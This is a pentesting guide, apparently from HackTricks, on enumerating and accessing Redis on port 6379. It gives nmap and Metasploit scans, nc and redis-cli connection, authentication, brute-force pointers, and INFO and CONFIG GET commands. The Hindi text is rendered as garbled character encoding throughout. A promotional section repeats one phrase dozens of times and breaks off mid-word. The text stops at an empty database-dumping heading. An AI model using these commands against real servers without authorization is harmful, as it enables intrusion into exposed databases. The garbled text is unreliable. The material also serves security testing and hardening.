# 6379 - рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рд░реЗрдбрд┐рд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдореЗрдВ рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣реЛрддреА рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ рдЗрдирд╛рдо рдорд┐рд▓реЗрдЧрд╛ред

**Web3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЗрд╕рдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ web3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**Web3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддрд┐рд╕реНрдкрд░реНрдзрд╛ рд╕реВрдЪрдХрд╛рдВрдХ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддреНрдпрд╛рдорд┐рдд рдм
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЧрдгрдирд╛

рдХреБрдЫ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рдЬреЛ рдПрдХ рд░реЗрдбрд┐рд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## рдореИрдиреБрдЕрд▓ рдЬрд╛рдВрдЪ

### рдмреИрдирд░

Redis рдПрдХ **рдЯреЗрдХреНрд╕реНрдЯ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓** рд╣реИ, рдЖрдк рдмрд╕ **рд╕реЙрдХреЗрдЯ рдореЗрдВ рдХрдорд╛рдВрдб рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╡рд╛рдкрд╕ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реЗ рдорд╛рди рдкрдардиреАрдп рд╣реЛрдВрдЧреЗред рдпрд╣рд╛рдВ рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ Redis **ssl/tls** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрд▓рд╛ рд╕рдХрддрд╛ рд╣реИ (рд▓реЗрдХрд┐рди рдпрд╣ рдмрд╣реБрдд рдЕрдЬреАрдм рд╣реЛрдЧрд╛)ред

рдПрдХ рд╕рд╛рдорд╛рдиреНрдп Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рдЖрдк `nc` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЖрдк `redis-cli` рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
**рдкрд╣рд▓реА рдХрдорд╛рдВрдб** рдЬреЛ рдЖрдк рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ рд╣реИ **`info`**ред рдпрд╣ Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдЖрдЙрдЯрдкреБрдЯ рд▓реМрдЯрд╛ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рд▓реМрдЯрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
-NOAUTH Authentication required.
```
рдЗрд╕ рдЕрдВрддрд┐рдо рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдкрдХреЛ Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП **рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### Redis рдкреНрд░рдорд╛рдгреАрдХрд░рдг

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ** Redis рдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдмрд┐рдирд╛** рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо + рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗред\
рдЖрдк _**redis.conf**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `requirepass` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб **рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рд╕реЗрд╡рд╛ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рддрдХ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдХреЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ: `config set requirepass p@ss$12E45`ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, _**redis.conf**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ `masteruser` рдореЗрдВ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% hint style="info" %}
рдпрджрд┐ рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо "**default**" рд╣реЛрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Redis рдХреЗ рдмрд╛рд╣рд░ рд╕реЗ рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ рдХреЛрдИ **рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реИ** рдХрд┐ рдХреНрдпрд╛ Redis рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛+рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
{% endhint %}

рдЗрд╕ рддрд░рд╣ рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдкрдХреЛ Redis рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рд╣реЛрдЧреА, рдЗрд╕рд▓рд┐рдП рдЖрдк [**рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕**](../generic-methodologies-and-resources/brute-force.md#redis) рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдпрджрд┐ рдЖрдк рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг рдкрд╛рдПрдВрдЧреЗ рддреЛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЕрдзрд┐рдХрд╛рд░реАрдХрд░рдг рд╕рддреНрд░** рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
AUTH <username> <password>
```
**рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг** рдХреЗ рд╕рд╛рде рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓реЗрдЧреА: `+OK`

### **рдкреНрд░рдорд╛рдгрд┐рдд рдЬрд╛рдБрдЪ**

рдпрджрд┐ Redis рдЗрдВрд╕реНрдЯреЗрдВрд╕ **рдЧреИрд░ рдирд╛рдордЪреАрди** рдХрдиреЗрдХреНрд╢рди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЖрдкрдиреЗ рдХреБрдЫ **рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрд┐рдХрд░рдг** рдкрд╛рдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**рдЕрдиреНрдп Redis рдХрдорд╛рдВрдб** [**рдпрд╣рд╛рдВ**](https://redis.io/topics/data-types-intro) **рдФрд░** [**рдпрд╣рд╛рдВ**](https://lzone.de/cheat-sheet/Redis)** рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред**\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ Redis рдХрдорд╛рдВрдбреЛрдВ рдХреЛ рдирд╛рдорд╛рдВрдХрд┐рдд** рдпрд╛ _redis.conf_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрд╕ рдкрдВрдХреНрддрд┐ рд╕реЗ FLUSHDB рдХрдорд╛рдВрдб рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```
rename-command FLUSHDB ""
```
рдпрд╣рд╛рдВ Redis рд╕реЗрд╡рд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд╣реИ: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

рдЖрдк рдпрд╣рд╛рдВ рд░реЗрдбрд┐рд╕ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рдореЙрдирд┐рдЯрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`monitor`** рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдпрд╛ рд╢реАрд░реНрд╖ **25 рд╕рдмрд╕реЗ рдзреАрдореЗ рдХреНрд╡реЗрд░реА** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`slowlog get 25`** рдХреЗ рд╕рд╛рдеред

рдЕрдзрд┐рдХ рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ Redis рдХрдорд╛рдВрдбреНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЬрд╛рдиреЗрдВ: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдбрдВрдк рдХрд░рдирд╛**

